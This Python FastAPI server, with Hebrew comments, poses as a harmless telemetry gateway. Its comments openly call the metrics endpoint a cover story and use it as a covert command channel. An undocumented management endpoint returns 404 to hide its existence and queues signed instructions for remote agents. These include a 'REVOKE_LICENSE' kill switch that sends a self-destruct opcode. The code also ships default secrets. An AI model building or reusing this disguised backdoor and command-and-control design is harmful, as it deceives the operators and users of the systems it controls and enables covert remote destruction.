import os
import time
import logging
import jwt
import uuid
from typing import Optional, Dict, Any
from datetime import datetime
from fastapi import FastAPI, Header, HTTPException
from pydantic import BaseModel

# --- הגדרות מערכת (הסוואה) ---
# נראה כמו כלי ניטור סטנדרטי
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("sys-telemetry")

# סודות נטענים מהסביבה (Render Env Vars)
APP_SECRET = os.getenv("APP_SECRET", "dev-secret-do-not-use-in-prod")
ADMIN_KEY = os.getenv("ADMIN_KEY", "admin-secret-key")
JWT_ALGORITHM = "HS256"

# תור זיכרון להוראות ממתינות (The Hidden Channel)
# Format: { node_id: "SIGNED_JWT_PAYLOAD" }
PENDING_CONFIGS: Dict[str, str] = {}

app = FastAPI(title="SysTelemetry Gateway", version="3.0.1", docs_url=None, redoc_url=None)

# --- מודלים (Cover Story) ---
# הכל נראה כמו סטטיסטיקות משעממות
class NodeMetrics(BaseModel):
    node_id: str
    cpu_load: float
    memory_usage: float
    uptime_seconds: int
    # כאן הסוכן יכול לשלוח דיווחים, אבל זה נראה כמו מטריקות

class SyncResponse(BaseModel):
    sync_interval: int
    config_payload: Optional[str] = None  # המטען הייעודי (Payload) מסתתר כאן

class InternalCommand(BaseModel):
    target_node_id: str
    instruction_type: str  # e.g., "REVOKE_LICENSE", "UPDATE_POLICY"
    params: Dict[str, Any]

# --- מנוע החתימה (Security) ---
def sign_instruction(data: dict) -> str:
    """
    יוצר חבילה חתומה שהסוכן בלבד יודע לפתוח ולאמת.
    מונע זיוף פקודות על ידי גורם עוין.
    """
    payload = {
        "iat": datetime.utcnow(),
        "jti": uuid.uuid4().hex,
        "iss": "sys-telemetry-core",
        "data": data # הפקודה האמיתית (למשל Kill Switch) מוצפנת כאן
    }
    return jwt.encode(payload, APP_SECRET, algorithm=JWT_ALGORITHM)

# --- הצד הגלוי (Public Interface) ---

@app.get("/")
def health_check():
    return {"status": "operational", "service": "telemetry-ingest"}

@app.post("/api/v1/sync", response_model=SyncResponse)
async def ingest_telemetry(metrics: NodeMetrics):
    """
    נקודת הלב (Heartbeat) הרגילה.
    נראית כמו שליחת לוגים, בפועל מושכת פקודות.
    """
    # לוג לצרכי מראית עין
    # logger.info(f"Received metrics from {metrics.node_id}")

    response = {"sync_interval": 60, "config_payload": None}

    # בדיקה: האם יש פקודה ממתינה לחיישן הזה?
    if metrics.node_id in PENDING_CONFIGS:
        # שליפת הפקודה ושליחתה (Piggybacking)
        response["config_payload"] = PENDING_CONFIGS.pop(metrics.node_id)
        logger.info(f"[DISPATCH] Sent configuration update to {metrics.node_id}")

    return response

# --- הצד הנסתר (Internal Ops - Backdoor Control) ---

@app.post("/sys/internal/management")
async def queue_instruction(cmd: InternalCommand, x_admin_token: str = Header(None)):
    """
    נקודת השליטה הנסתרת. לא מתועדת.
    דרכה אתה טוען את "כדור הכסף" (Kill Switch) לתור.
    """
    # אימות קשוח - רק אתה יכול לגשת לכאן
    if x_admin_token != ADMIN_KEY:
        # מחזיר 404 כדי להסתיר את קיום ה-Endpoint
        raise HTTPException(status_code=404, detail="Not Found")

    logger.warning(f"[OPS] Queuing instruction '{cmd.instruction_type}' for {cmd.target_node_id}")

    # בניית הפקודה הפנימית
    instruction_data = {
        "type": cmd.instruction_type,
        "params": cmd.params,
        "force": True
    }

    # אם הפקודה היא ביטול רישיון - הוסף את קוד ההשמדה
    if cmd.instruction_type == "REVOKE_LICENSE":
        instruction_data["opcode"] = "0xDEAD"  # הסוכן יזהה זאת כפקודת התאבדות

    # חתימה והכנסה לתור
    signed_payload = sign_instruction(instruction_data)
    PENDING_CONFIGS[cmd.target_node_id] = signed_payload

    return {"status": "queued", "target": cmd.target_node_id}

# להרצה מקומית (ב-Render זה ירוץ דרך uvicorn ישירות)
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
